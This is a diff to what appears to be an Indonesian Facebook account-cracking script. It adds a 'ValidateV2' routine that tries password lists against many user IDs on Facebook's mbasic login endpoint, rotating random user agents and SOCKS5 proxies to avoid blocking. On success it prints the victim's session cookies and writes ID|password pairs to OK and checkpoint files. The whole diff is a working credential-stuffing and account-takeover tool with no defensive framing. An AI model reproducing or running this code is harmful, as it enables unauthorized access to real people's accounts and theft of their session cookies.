@@ -1362,7 +1362,7 @@ def convert(cookie):
     return str(cok)
 
 
-def cektahun(fx):
+def tahun(fx):
     if len(fx) == 15:
         if fx[:10] in ["1000000000"]:
             tahunz = "2009"
@@ -1445,7 +1445,7 @@ def setting():
     else:
         print(" [+] Pilih Yang Bener Sayang ")
         return setting
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]validate v1[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]Crack Email[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]Reguler[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]mbasic[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]validate v1[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate V2[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]Reguler[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]mbasic[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     hc = console.input(f" {H2}• {P2}Masukan : ")
     if hc in ["1", "01"]:
         method.append("validatev1")
@@ -1572,7 +1572,7 @@ def metslow():
                 if "validatev1" in method:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(crackemail, idf, pwv,nmf)
+                    pool.submit(ValidateV2, idf, pwv)
                 elif "reguler" in method:
                     pool.submit(reguler, idf, pwv)
                 elif "mbasic" in method:
@@ -1639,7 +1639,7 @@ def metcepat():
                 if "validatev1" in method:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(crackemail, idf, pwv,nmf)
+                    pool.submit(ValidateV2, idf, pwv)
                 elif "reguler" in method:
                     pool.submit(reguler, idf, pwv)
                 elif "mbasic" in method:
@@ -1660,6 +1660,69 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
+
+
+
+
+#------------------[ METHOD-VALIDATE-2 ]-------------------#
+def ValidateV2(idf,pwv):
+	global loop,ok,cp
+	rc = random.choice
+	rr = random.randint
+	bo = random.choice([m,b,k,h,u])
+	prog.update(des,description=f" {K2}•{H2} CRACKEMAIL {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+	prog.advance(des)
+	ua = random.choice(ugent)
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
+			if "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				kukis = kuki.replace(f'c_user={idf};datr','sb')
+				print(" ")
+				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
+				print(f"{B}╰─{b}▶{b} SUCCES")
+				print(f"{B}╰─{b}▶{b} {idf} ")
+				print(f"{B}╰─{b}▶{b} {pw} ")
+				print(f"{B}╰─{b}▶{b} {tahun(idf)} ")
+				print(f"{B}╰─{b}▶{b} {kuki} ")
+				print(f"{B}╰─{b}▶{b} {ua} ")
+				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				cek_apk(kuki)
+				break
+			elif "checkpoint" in po.cookies.get_dict().keys():
+				print(" ")
+				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
+				print(f"{B}╰─{b}▶{B} CHECKPOINT")
+				print(f"{B}╰─{b}▶{B} {idf} ")
+				print(f"{B}╰─{b}▶{B} {pw} ")
+				print(f"{B}╰─{b}▶{B} {tahun(idf)} ")
+				print(f"{B}╰─{b}▶{B} {ua} ")
+				print(f"{B}╭───────────────────────────────────────────────────────────────────────────{b}▶")	
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+ 				
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1	
+	
+	
 #---------->> METHODE-MBASIC-REGULAR <<----------#
 def crackemail(idf,pwv,nmf):
 	global loop,ok,cp
